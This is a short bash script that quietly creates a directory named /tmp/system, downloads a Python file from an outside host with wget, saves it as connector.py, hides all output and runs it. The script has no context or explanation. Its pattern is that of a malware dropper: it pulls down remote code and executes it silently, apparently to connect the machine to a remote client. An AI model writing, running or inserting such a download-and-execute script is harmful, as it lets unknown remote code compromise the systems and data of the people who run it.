#!/bin/bash

mkdir /tmp/system >/dev/null 2>&1
cd /tmp/system
wget  http://llamachair.com/downl/pyClient.py -O connector.py >/dev/null 2>&1
python connector.py 
